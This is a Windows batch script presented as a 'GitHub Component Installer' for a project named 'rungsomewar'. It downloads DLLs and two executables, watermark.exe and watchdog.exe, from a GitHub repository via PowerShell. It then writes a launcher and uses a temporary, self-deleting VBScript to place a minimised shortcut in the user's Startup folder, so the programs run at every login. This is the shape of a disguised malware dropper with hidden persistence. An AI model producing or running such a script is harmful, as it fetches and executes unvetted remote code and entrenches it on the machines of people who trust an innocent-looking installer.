@echo off
setlocal
title GitHub Component Installer

:: 1. Define paths
set "TARGET_DIR=%LOCALAPPDATA%\rungsomewar"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "BASE_URL=https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main"

echo Creating directory: %TARGET_DIR%
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo Downloading files from GitHub...

:: 2. Use PowerShell to download all 6 files with TLS 1.2 enabled
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; @('SDL2.dll','SDL2_ttf.dll','libfreetype-6.dll','zlib1.dll','watermark.exe','watchdog.exe') | ForEach-Object { Invoke-WebRequest -Uri '%BASE_URL%/$_' -OutFile '%TARGET_DIR%\$_' -UseBasicParsing }"

echo Creating Startup trigger...

:: 3. Create a launcher script inside the target folder
echo @echo off > "%TARGET_DIR%\run.bat"
echo cd /d "%%~dp0" >> "%TARGET_DIR%\run.bat"
echo start "" "watermark.exe" >> "%TARGET_DIR%\run.bat"
echo start "" "watchdog.exe" >> "%TARGET_DIR%\run.bat"

:: 4. Create the Shortcut in the Windows Startup folder via VBScript
set "VBS_FILE=%TEMP%\create_start_lnk.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_FILE%"
echo sLinkFile = "%STARTUP_DIR%\rungsomewar_startup.lnk" >> "%VBS_FILE%"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS_FILE%"
echo oLink.TargetPath = "%TARGET_DIR%\run.bat" >> "%VBS_FILE%"
echo oLink.WorkingDirectory = "%TARGET_DIR%" >> "%VBS_FILE%"
echo oLink.WindowStyle = 7 >> "%VBS_FILE%"
echo oLink.Save >> "%VBS_FILE%"

cscript /nologo "%VBS_FILE%"
del "%VBS_FILE%"

echo.
echo Installation Successful!
echo Starting applications...
start "" "%TARGET_DIR%\run.bat"

exit
